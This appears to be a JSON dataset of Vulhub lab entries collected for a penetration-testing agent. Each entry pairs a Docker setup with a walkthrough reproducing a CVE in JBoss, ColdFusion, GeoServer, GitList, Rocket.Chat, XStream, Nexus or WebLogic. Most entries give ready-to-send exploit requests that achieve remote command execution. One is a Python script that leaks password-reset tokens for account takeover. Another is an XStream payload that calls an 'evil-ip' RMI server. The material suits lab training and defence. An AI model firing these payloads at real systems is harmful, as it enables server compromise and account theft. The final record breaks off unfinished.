    "readme": "# JBoss 4.x JBossMQ JMS Deserialization Remote Code Execution (CVE-2017-7504)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nRed Hat JBoss Application Server is a JavaEE-based open source application server. In JBoss AS 4.x and earlier versions, there is a deserialization vulnerability in the HTTPServerILServlet.java file of the JMS over HTTP Invocation Layer in JBossMQ implementation. Remote attackers can exploit this vulnerability to execute arbitrary code by using specially crafted serialized data.\n\nReferences:\n\n- https://github.com/joaomatosf/JavaDeserH2HC\n- https://www.youtube.com/watch?v=jVMr4eeJ2Po\n\n## Environment Setup\n\nExecute the following command to start JBoss AS 4.0.5:\n\n```\ndocker compose up -d\n```\n\nAfter the environment is started, the target will be available at `http://your-ip:8080`.\n\n## Vulnerability Reproduce\n\nThis vulnerability exists in the `/jbossmq-httpil/HTTPServerILServlet` request. We can use the CommonsCollections5 exploitation chain from ysoserial to reproduce it. Generate the payload:\n\n```\njava -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 \"touch /tmp/success\" > 1.ser\n```\n\nSend the content of 1.ser file as POST Body:\n\n```\ncurl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @1.ser\n```\n\n![](1.png)\n\nExecute `docker compose exec jboss bash` to enter the container, and you can see that `/tmp/success` has been successfully created.\n"
  },
  {
    "filename": "CVE-2017-3066.md",
    "filenamenomd": "CVE-2017-3066",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/coldfusion/CVE-2017-3066/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/coldfusion/CVE-2017-3066/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 102 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  coldfusion:\n    image: vulhub/coldfusion:11u3\n    ports:\n      - \"8500:8500\"\n\n```\n\n",
    "readme": "# Adobe ColdFusion AMF Deserialization Remote Command Execution (CVE-2017-3066)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nAdobe ColdFusion is a commercial rapid web-application development computing platform created by J. J. Allaire in 1995.\n\nAdobe ColdFusion 2016 Update 3 and earlier, ColdFusion 11 update 11 and earlier, ColdFusion 10 Update 22 and earlier have a Java deserialization vulnerability in the Apache BlazeDS library. Successful exploitation could lead to arbitrary code execution.\n\nReferences:\n\n- https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html\n- https://www.exploit-db.com/exploits/43993\n- https://github.com/codewhitesec/ColdFusionPwn\n\n## Vulnerable environment\n\nStart a Adobe ColdFusion 11 update 3:\n\n```\ndocker compose up -d\n```\n\nAfter a few minutes wait, visit `http://your-ip:8500/CFIDE/administrator/index.cfm` with password `vulhub`, you can install the Adobe ColdFusion successfully.\n\n## Exploit\n\nGenerate a POC via [ColdFusionPwn](https://github.com/codewhitesec/ColdFusionPwn) in the `poc.ser`:\n\n```\njava -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/success' poc.ser\n```\n\nSend the request to `http://your-ip:8500/flex2gateway/amf`, which contains the `application/x-amf` Content-Type and POC within the body:\n\n```\nPOST /flex2gateway/amf HTTP/1.1\nHost: your-ip:8500\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-amf\nContent-Length: 2853\n\n[...poc...]\n```\n\n![](1.png)\n\n`/tmp/success` is successfully created:\n\n![](2.png)\n\nGet a reverse shell:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2022-24816.md",
    "filenamenomd": "CVE-2022-24816",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/geoserver/CVE-2022-24816/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/geoserver/CVE-2022-24816/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 96 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/geoserver:2.17.2\n   ports:\n    - \"8080:8080\"\n    - \"5005:5005\"\n\n```\n\n",
    "readme": "# GeoServer Remote Code Injection caused by JAI-EXT (CVE-2022-24816/CVE-2023-35042)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nGeoServer is an open-source software server written in Java that provides the ability to view, edit, and share geospatial data. It is designed to be a flexible, efficient solution for distributing geospatial data from a variety of sources such as Geographic Information System (GIS) databases, web-based data, and personal datasets.\n\nGeoServer uses the Jiffle map algebra language provided by JAI-EXT, which allows efficiently execute map algebra over large images. A code injection vulnerability (CVE-2022-24816) has been found in JAI-EXT versions 1.2.21 and earlier, that allows a remote code execution to be performed by properly crafting a Jiffle invocation.\n\nWhen this vulnerability affects GeoServer, it is also known as [CVE-2023-35042](https://osgeo-org.atlassian.net/browse/GEOS-10458). GeoServer versions 2.20.4, 2.19.6, and 2.18.6 and later have fixed this vulnerability by updating the JAI-EXT dependency.\n\nReferences:\n\n- <https://www.synacktiv.com/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver>\n- <https://github.com/geosolutions-it/jai-ext/security/advisories/GHSA-v92f-jx6p-73rx>\n- <https://geoserver.org/vulnerability/2022/04/11/geoserver-2-jiffle-jndi-rce.html>\n- <https://osgeo-org.atlassian.net/browse/GEOS-10458>\n- <https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2022/CVE-2022-24816.yaml>\n\n## Vulnerable Environment\n\nExecute the following command to start a GeoServer 2.17.2 server:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can browse the default page of GeoServer at `http://your-ip:8080/geoserver`.\n\n## Exploit\n\nThe vulnerability exists in the WMS endpoint. An attacker can execute arbitrary Java code by sending a specially crafted request to `/geoserver/wms`. The request should include a malicious Jiffle expression that will be evaluated by the server.\n\nSend a request like this to exploit the vulnerability:\n\n```\nPOST /geoserver/wms HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/xml\nContent-Length: 2191\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<wps:Execute version=\"1.0.0\" service=\"WPS\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"http://www.opengis.net/wps/1.0.0\" xmlns:wfs=\"http://www.opengis.net/wfs\" xmlns:wps=\"http://www.opengis.net/wps/1.0.0\" xmlns:ows=\"http://www.opengis.net/ows/1.1\" xmlns:gml=\"http://www.opengis.net/gml\" xmlns:ogc=\"http://www.opengis.net/ogc\" xmlns:wcs=\"http://www.opengis.net/wcs/1.1.1\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" xsi:schemaLocation=\"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd\">\n<ows:Identifier>ras:Jiffle</ows:Identifier>\n<wps:DataInputs>\n    <wps:Input>\n    <ows:Identifier>coverage</ows:Identifier>\n    <wps:Data>\n        <wps:ComplexData mimeType=\"application/arcgrid\"><![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]></wps:ComplexData>\n    </wps:Data>\n    </wps:Input>\n    <wps:Input>\n    <ows:Identifier>script</ows:Identifier>\n    <wps:Data>\n        <wps:LiteralData>dest = y() - (500); // */ public class Double {    public static double NaN = 0;  static { try {  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"id\").getInputStream())); String line = null; String allLines = \" - \"; while ((line = reader.readLine()) != null) { allLines += line; } throw new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /**</wps:LiteralData>\n    </wps:Data>\n    </wps:Input>\n    <wps:Input>\n    <ows:Identifier>outputType</ows:Identifier>\n    <wps:Data>\n        <wps:LiteralData>DOUBLE</wps:LiteralData>\n    </wps:Data>\n    </wps:Input>\n</wps:DataInputs>\n<wps:ResponseForm>\n    <wps:RawDataOutput mimeType=\"image/tiff\">\n    <ows:Identifier>result</ows:Identifier>\n    </wps:RawDataOutput>\n</wps:ResponseForm>\n</wps:Execute>\n```\n\nAfter sending this request, the malicious Java code embedded in the Jiffle script will be executed by the server. The command output will be captured and returned to the client within a `java.lang.ExceptionInInitializerError` message:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2018-1000533.md",
    "filenamenomd": "CVE-2018-1000533",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/gitlist/CVE-2018-1000533/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/gitlist/CVE-2018-1000533/Dockerfile\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/gitlist/CVE-2018-1000533/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 67 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   build: .\n   ports:\n    - \"8080:80\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/gitlist/CVE-2018-1000533/Dockerfile\n\n- Extension: \n- Language: unknown\n- Size: 407 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nFROM vulhub/gitlist:0.6.0\n\nLABEL maintainer=\"phithon <root@leavesongs.com>\"\n\nRUN set -ex; \\\n    mkdir -p /data/example; \\\n    cd /data/example; \\\n    echo \"# example repository\\n\\nThis is a example repository for vulhub\" > README.md; \\\n    git init; \\\n    git config --global user.name \"Vulhub\"; \\\n    git config --global user.email \"example@vulhub.org\"; \\\n    git add . ; \\\n    git commit -m \"add readme\";\n\n```\n\n",
    "readme": "# GitList 0.6.0 Remote Command Execution (CVE-2018-1000533)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nGitList is an elegant and modern git repository viewer.\n\nGitList version <= 0.6 contains a passing incorrectly sanitized input to system function vulnerability in `searchTree` function that can result in executing arbitrary commands as PHP user. This attack appear to be exploitable via POST request using search form.\n\nReferences:\n\n- <https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322>\n- <https://www.exploit-db.com/exploits/44548>\n- <https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html>\n\n## Vulnerable environment\n\nExecute following command to start a GitList server 0.6.0:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, browse the `http://your-ip:8080` and you will see a repository named `example`.\n\n## Vulnerability Principle\n\nGitList uses `git grep` while searching code in repository:\n\n```php\npublic function searchTree($query, $branch)\n{\n    if (empty($query)) {\n        return null;\n    }\n\n    $query = escapeshellarg($query);\n\n    try {\n        $results = $this->getClient()->run($this, \"grep -i --line-number {$query} $branch\");\n    } catch (\\RuntimeException $e) {\n        return false;\n    }\n```\n\n`$query` is the search keyword, `$branch` is the target branch.\n\n`id` will be executed if attacker passed `--open-files-in-pager=id;` as the `$query`'s value:\n\n![](img/1.png)\n\nThere are two reasons for this vulnerability:\n\n1. Misunderstanding of the `escapeshellarg` function, resulting in arguments injection\n2. The value of the `--open-files-in-pager` argument of `git grep`, which will be directly executed\n\nTheoretically, after `$query = escapeshellarg($query);`, `$query` will become a string wrapped in single quotes. The premise of the bug is that the string should appear in the “parameter value” position, not in the parameter option.\n\nTo fix this issue, we can put the `$query` option behind `-e`:\n\n```\ngit grep -i --line-number -e '--open-files-in-pager=id;' master\n```\n\n![](img/2.png)\n\nThis is the suggestion from Git official:\n\n> -e\n> The next parameter is the pattern. This option has to be used for patterns starting with - and should be used in scripts passing user input to grep. Multiple patterns are combined by\n> or.\n\nGitList used another fix:\n\n```php\npublic function searchTree($query, $branch)\n{\n    if (empty($query)) {\n        return null;\n    }\n    $query = preg_replace('/(--?[A-Za-z0-9\\-]+)/', '', $query);\n    $query = escapeshellarg($query);\n    try {\n        $results = $this->getClient()->run($this, \"grep -i --line-number -- {$query} $branch\");\n    } catch (\\RuntimeException $e) {\n        return false;\n    }\n```\n\nFirstly, remove illegal `-` prefix from `$query`, then put it behind `--`. The double-dash (`--`) will be accepted as a delimiter indicating the end of options in command line.\n\n> A -- signals the end of options and disables further option processing. Any arguments after the -- are treated as filenames and arguments. An argument of - is equivalent to --.\n>\n> If arguments remain after option processing, and neither the -c nor the -s option has been supplied, the first argument is assumed to be the name of a file containing shell commands. If bash is invoked in this fashion, $0 is set to the name of the file, and the positional parameters are set to the remaining arguments. Bash reads and executes commands from this file, then exits. Bash's exit status is the exit status of the last command executed in the script. If no commands are executed, the exit status is 0. An attempt is first made to open the file in the current directory, and, if no file is found, then the shell searches the directories in PATH for the script.\n\nSo this this patch is acceptable, except that the `preg_replace` in the first step affects the normal search function.\n\n## Exploit\n\nSend following request:\n\n```\nPOST /example/tree/a/search HTTP/1.1\nHost: your-ip:8080\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nContent-Length: 56\n\nquery=--open-files-in-pager=touch /tmp/success;\n```\n\nNoted that there are two arguments in URL: `/[repo_name]/tree/[keyword]/search`. `[repo_name]` must be a existing repository in the GitList, `[keyword]` is a search keyword that produces at least one result.\n\nAfter the request is sent, use `docker compose exec web bash` to enter the container and you can see that `/tmp/success` has been successfully created:\n\n![](img/4.png)\n"
  },
  {
    "filename": "CVE-2021-22911.md",
    "filenamenomd": "CVE-2021-22911",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/rocketchat/CVE-2021-22911/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/rocketchat/CVE-2021-22911/CVE-2021-22911.py\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/rocketchat/CVE-2021-22911/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 1373 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  rocketchat:\n    image: vulhub/rocketchat:3.12.1\n    command: >\n      bash -c\n        \"for i in `seq 1 30`; do\n          node main.js &&\n          s=$$? && break || s=$$?;\n          echo \\\"Tried $$i times. Waiting 5 secs...\\\";\n          sleep 5;\n        done; (exit $$s)\"\n    restart: unless-stopped\n    environment:\n      - PORT=3000\n      - ROOT_URL=http://localhost:3000\n      - MONGO_URL=mongodb://mongo:27017/rocketchat\n      - MONGO_OPLOG_URL=mongodb://mongo:27017/local\n      - MAIL_URL=smtp://smtp.email\n    depends_on:\n      - mongo\n    ports:\n      - 3000:3000\n\n  mongo:\n    image: mongo:4.0\n    restart: unless-stopped\n    command: mongod --smallfiles --oplogSize 128 --replSet rs0 --storageEngine=mmapv1\n    labels:\n      - \"traefik.enable=false\"\n\n  # this container's job is just run the command to initialize the replica set.\n  # it will run the command and remove himself (it will not stay running)\n  mongo-init-replica:\n    image: mongo:4.0\n    command: >\n      bash -c\n        \"for i in `seq 1 30`; do\n          mongo mongo/rocketchat --eval \\\"\n            rs.initiate({\n              _id: 'rs0',\n              members: [ { _id: 0, host: 'localhost:27017' } ]})\\\" &&\n          s=$$? && break || s=$$?;\n          echo \\\"Tried $$i times. Waiting 5 secs...\\\";\n          sleep 5;\n        done; (exit $$s)\"\n    depends_on:\n      - mongo\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/rocketchat/CVE-2021-22911/CVE-2021-22911.py\n\n- Extension: .py\n- Language: python\n- Size: 1686 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nimport sys\nimport time\nimport string\nimport json\nimport requests\n\n\nguess = '-_' + string.digits + string.ascii_letters\nsession = requests.session()\nsession.headers = {\n    'Content-Type': 'application/json',\n}\n\n\ndef reset_password(target: str, email: str):\n    payload = {\n        'msg': 'method',\n        'method': 'sendForgotPasswordEmail',\n        'params': [email],\n    }\n\n    session.post(\n        f'{target}/api/v1/method.callAnon/sendForgotPasswordEmail',\n        json={'message': json.dumps(payload)},\n    )\n    sys.stdout.write(\"[+] Password Reset Email Sent\\n\")\n    sys.stdout.flush()\n\n\ndef inject_token(target: str):\n    payload = {\n        'msg': 'method',\n        'method': 'getPasswordPolicy',\n        'params': [\n            {\n                'token': {'$regex': '^'}\n            }\n        ],\n    }\n    for i in range(43):\n        current = payload['params'][0]['token']['$regex']\n        sys.stdout.write(f'[*] Guess No.{i + 1} character: ')\n        for ch in guess:\n            payload['params'][0]['token']['$regex'] = current + ch\n            response = session.post(\n                f'{target}/api/v1/method.callAnon/getPasswordPolicy',\n                json={'message': json.dumps(payload)},\n            )\n            if b'Meteor.Error' not in response.content:\n                sys.stdout.write(f\"\\n[+] Current token is {payload['params'][0]['token']['$regex'][1:]}\\n\")\n                sys.stdout.flush()\n                break\n            else:\n                sys.stdout.write('.')\n                sys.stdout.flush()\n\n            time.sleep(1.5)\n\n\nif __name__ == '__main__':\n    target = sys.argv[1]\n    reset_password(target, sys.argv[2])\n    inject_token(target)\n\n```\n\n",
    "readme": "# Rocket Chat Pre-Auth Blind NoSQL Injection (CVE-2021-22911)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nRocket.chat is an open source team chat platform.\n\nAt Rocket Chat from 3.12.1 to 3.13.2, The `getPasswordPolicy` method is vulnerable to NoSQL injection attacks and does not require authentication/authorization. It can be used to take over normal user accounts by leaking password reset tokens.\n\nReferences:\n\n- https://blog.sonarsource.com/nosql-injections-in-rocket-chat\n- https://www.exploit-db.com/exploits/50108\n- https://github.com/CsEnox/CVE-2021-22911\n- https://paper.seebug.org/1652/\n\n## Vulnerable Application\n\nExecuting following command to start a Rocket Chat 3.12.1:\n\n```\ndocker compose up -d\n```\n\nOnce the server is started, visit `http://your-ip:3000` to see the installation wizard.\n\nAfter the installation is complete, in order to verify the attack, you need to add a normal user in the administration with the username `vulhub` and the email `vulhub@vulhub.org`.\n\n## Exploit\n\nThere is three steps to reproduce the vulnerability:\n\n1. Reset the password on the login page, and the server will generate a Password Reset Token in the database\n2. Use NoSQL injection to expose this Password Reset Token\n3. Use Password Reset Token to change the user's password\n\nAt the step two, you can use `$regex` directive to perform the attack.\n\nIn my scenario, when `$regex` is equal to `^7`, an error message returned:\n\n![](3.png)\n\nWhen `$regex` is equal to `^8`, the response is different. It proves that the Token is starts with `8`:\n\n![](4.png)\n\nUse this simple script [CVE-2021-22911.py](CVE-2021-22911.py) to exfiltrate the Password Reset Token:\n\n![](2.png)\n\nChange user password successfully:\n\n![](5.png)\n"
  },
  {
    "filename": "CVE-2021-29505.md",
    "filenamenomd": "CVE-2021-29505",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/xstream/CVE-2021-29505/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/xstream/CVE-2021-29505/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 89 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/xstream:1.4.16\n   ports:\n    - \"8080:8080\"\n\n```\n\n",
    "readme": "# XStream Deserialization Remote Command Execution (CVE-2021-29505)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nXStream is a simple library to serialize objects to XML and back again.\n\nXStream uses a blocklist mechanism when parsing XML text which is utilized to defend against deserialization vulnerabilities, but in 1.4.16 and earlier, blocklists are incomplete and attackers could use `sun.rmi.registry.RegistryImpl_Stub` to make an RMI request and execute arbitrary commands finally.\n\nReference links.\n\n- [https://x-stream.github.io/CVE-2021-29505.html][1]\n- https://paper.seebug.org/1543/\n\n## Vulnerable Environment\n\nStart a Springboot + XStream 1.4.16 server.\n\n```\ndocker compose up -d\n```\n\nOnce the environment is started, you can send the following request to `http://your-ip:8080` to test if the server has started successfully\n\n![](1.png)\n\n## POC\n\nFirst of all, you have to start a malicious RMI Registry on evil server using the JRMPListener of [ysoserial](https://github.com/frohoff/ysoserial).\n\n```\njava -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 \"touch /tmp/success\"\n```\n\nThis RMI Registry, upon receiving the request, returns a malicious serialized object constructed with `CommonsCollections6` gadget.\n\nThen, send the XML POC of CVE-2021-29505, replace **evil-ip** with address of evil RMI Registry.\n\n```\nPOST / HTTP/1.1\nHost: your-ip\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nConnection: close\nContent-Type: application/xml\nContent-Length: 3169\n\n<java.util.PriorityQueue serialization='custom'>\n    <unserializable-parents/>\n    <java.util.PriorityQueue>\n        <default>\n            <size>2</size>\n        </default>\n        <int>3</int>\n        <javax.naming.ldap.Rdn_-RdnEntry>\n            <type>12345</type>\n            <value class='com.sun.org.apache.xpath.internal.objects.XString'>\n                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>\n            </value>\n        </javax.naming.ldap.Rdn_-RdnEntry>\n        <javax.naming.ldap.Rdn_-RdnEntry>\n            <type>12345</type>\n            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>\n                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>\n                    <parsedMessage>true</parsedMessage>\n                    <soapVersion>SOAP_11</soapVersion>\n                    <bodyParts/>\n                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\n                        <attachmentsInitialized>false</attachmentsInitialized>\n                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>\n                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>\n                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>\n                                    <names>\n                                        <string>aa</string>\n                                        <string>aa</string>\n                                    </names>\n                                    <ctx>\n                                        <environment/>\n                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>\n                                            <java.rmi.server.RemoteObject>\n                                                <string>UnicastRef</string>\n                                                <string>evil-ip</string>\n                                                <int>1099</int>\n                                                <long>0</long>\n                                                <int>0</int>\n                                                <long>0</long>\n                                                <short>0</short>\n                                                <boolean>false</boolean>\n                                            </java.rmi.server.RemoteObject>\n                                        </registry>\n                                        <host>evil-ip</host>\n                                        <port>1099</port>\n                                    </ctx>\n                                </candidates>\n                            </aliases>\n                        </nullIter>\n                    </sm>\n                </message>\n            </value>\n        </javax.naming.ldap.Rdn_-RdnEntry>\n    </java.util.PriorityQueue>\n</java.util.PriorityQueue>\n```\n\nThe malicious RMI registry receives the RMI request successfully.\n\n![](2.png)\n\nEnter into the XStream container, ``touch /tmp/success`` has been successfully executed:\n\n![](3.png)\n\nSignificantly, POC from [official website][1] is wrong, you must not use it.\n\n[1]: https://x-stream.github.io/CVE-2021-29505.html\n"
  },
  {
    "filename": "CVE-2019-7238.md",
    "filenamenomd": "CVE-2019-7238",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/nexus/CVE-2019-7238/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nexus/CVE-2019-7238/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 105 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '3'\nservices:\n web:\n   image: vulhub/nexus:3.14.0\n   ports:\n    - \"8081:8081\"\n    - \"5005:5005\"\n\n```\n\n",
    "readme": "# Nexus Repository Manager 3 Unauthenticated Remote Code Execution (CVE-2019-7238)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nNexus Repository Manager is a repository manager that organizes, stores and distributes artifacts needed for development.\n\nIn the version <= 3.14.0, insufficient access control and JEXL expression injection issue have been discovered in Nexus Repository 3 that allows for an unauthenticated attacker to execute arbitrary code by crafting a malicious request to Nexus Repository.\n\nReferences:\n\n- https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019\n- https://xz.aliyun.com/t/4136\n- https://www.anquanke.com/post/id/171116\n- http://commons.apache.org/proper/commons-jexl/\n\n## Vulnerable environment\n\nExecute following command to start a Nexus Repository Manager version 3.21.1:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, browse `http://your-ip:8081` to see the home page of Nexus. Login the admin panel with account `admin:admin123` and finish the initialize wizard.\n\nThen, upload a JAR package through maven-releases:\n\n![](1.png)\n\nTo exploit this issue, Nexus Repository should have at least one package.\n\n## Exploit\n\nSend following request to execute `touch /tmp/success` command, no authentication needed:\n\n```\nPOST /service/extdirect HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0\nAccept: */*\nContent-Type: application/json\nX-Requested-With: XMLHttpRequest\nContent-Length: 368\nConnection: close\n\n{\"action\":\"coreui_Component\",\"method\":\"previewAssets\",\"data\":[{\"page\":1,\"start\":0,\"limit\":50,\"sort\":[{\"property\":\"name\",\"direction\":\"ASC\"}],\"filter\":\n[{\"property\":\"repositoryName\",\"value\":\"*\"},{\"property\":\"expression\",\"value\":\"233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/success')\"},{\"property\":\"type\",\"value\":\"jexl\"}]}],\"type\":\"rpc\",\"tid\":8}\n```\n\nAs you can see, `/tmp/success` is executed:\n\n![](2.png)\n\nThe principle is that the JEXL expression in the expression position is executed, please refer to the documentation for details.\n\nUse BCEL classloader to archive printable response:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2018-2894.md",
    "filenamenomd": "CVE-2018-2894",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/weblogic/CVE-2018-2894/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/weblogic/CVE-2018-2894/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 89 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n weblogic:\n   image: vulhub/weblogic:12.2.1.3-2018\n   ports:\n    - \"7001:7001\"\n\n```\n\n",
    "readme": "# Weblogic Arbitrary File Upload Vulnerability (CVE-2018-2894)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nOracle Weblogic Server is a popular enterprise application server that provides a wide range of features for building and deploying enterprise applications.\n\nIn Oracle's July 2018 update, a vulnerability in the Weblogic Web Service Test Page was fixed that allowed arbitrary file upload. The Web Service Test Page is disabled by default in \"Production Mode\", so this vulnerability has certain limitations.\n\nBy exploiting this vulnerability, attackers can upload arbitrary JSP files and gain server access.\n\nReference links:\n\n- http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html\n- https://mp.weixin.qq.com/s/y5JGmM-aNaHcs_6P9a-gRQ\n- https://xz.aliyun.com/t/2458\n\n## Environment Setup\n\nExecute the following command to start Weblogic 12.2.1.3:\n\n```\ndocker compose up -d\n```\n\nAfter the environment starts, visit `http://your-ip:7001/console` to see the backend login page.\n\nExecute `docker compose logs | grep password` to view the administrator password. The administrator username is `weblogic`.\n\nAfter logging into the backend, click on the `base_domain` configuration, and in \"Advanced\" enable the \"Enable Web Service Test Page\" option:\n\n![](img/1.png)\n\n## Vulnerability Reproduce\n\nAs a attacker, visit `http://your-ip:7001/ws_utc/config.do` and set the Work Home Dir to `/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css`. We set the directory to the static file CSS directory of the `ws_utc` application because this directory can be accessed without permissions, which is crucial.\n\n![](img/2.png)\n\nThen click on Security -> Add, and upload a webshell:\n\n![](img/3.png)\n\nAfter uploading, check the returned data packet which contains a timestamp:\n\n![](img/4.png)\n\nThen visit `http://your-ip:7001/ws_utc/css/config/keystore/[timestamp]_[filename]` to execute the webshell:\n\n![](img/5.png)\n"
  },
  {
    "filename": "CVE-2024-4956.md",
    "filenamenomd": "CVE-2024-4956",
